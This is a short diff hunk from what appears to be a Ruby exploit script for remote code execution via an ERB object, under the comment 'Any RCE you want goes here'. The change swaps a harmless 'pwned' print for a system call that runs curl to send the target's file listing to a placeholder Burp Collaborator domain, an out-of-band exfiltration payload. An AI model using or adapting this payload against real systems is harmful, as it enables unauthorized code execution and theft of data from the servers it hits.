@@ -19,7 +19,7 @@ end
 
 # Any RCE you want goes here
 code = <<-EOS
-puts "pwned"
+system('curl --data "$(ls)" <burp-collaborator-domain>')
 EOS
 
 erb = ERB.allocate
